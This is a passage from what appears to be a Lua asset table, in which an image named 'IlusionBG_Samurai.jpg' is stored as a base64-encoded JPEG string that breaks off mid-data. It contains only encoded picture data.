EOY3UutdqnMaLW/RIxItdomeljikrHxSh2jxp1ROh3ePy1hh1NO668jR7MmKc6Z//Z]],
  ["IlusionBG_Samurai.jpg"] = [[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